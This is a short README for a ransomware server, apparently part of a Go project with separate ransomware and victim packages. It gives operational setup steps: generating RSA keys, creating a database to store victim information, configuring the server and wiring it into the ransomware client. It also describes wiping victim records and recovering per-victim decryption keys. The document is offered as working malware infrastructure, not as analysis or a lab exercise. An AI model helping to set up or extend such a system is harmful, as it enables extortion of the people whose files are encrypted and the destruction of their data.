# Ransomware server

## How to setup

First you need to create a private and public RSA encryption key using the `gen_rsa` utility. Secondly you need to create a database in which the victim information is stored. Then create an environment variable file `.env` like so:

```
db_host=host of the database
db_port=port in which the database is hosted
db_user=name of the database user
db_name=name of the database
port=port in which the server is hosted
```

After all this you need to update the server information in `../ransomware` and `../victim` packages.

## Clearing victim data

Just running: `go run server.go remove_data`, will remove all victim information from the database.

## Key decryption without server

You can decrypt files using the `decrypt_rsa_key.go <uuid> <database|file>` program. The database flag will search for the victim data using the uuid from the database to get the encryption key. The file flag will search for the `decrypt` file in the home directory for the key data.
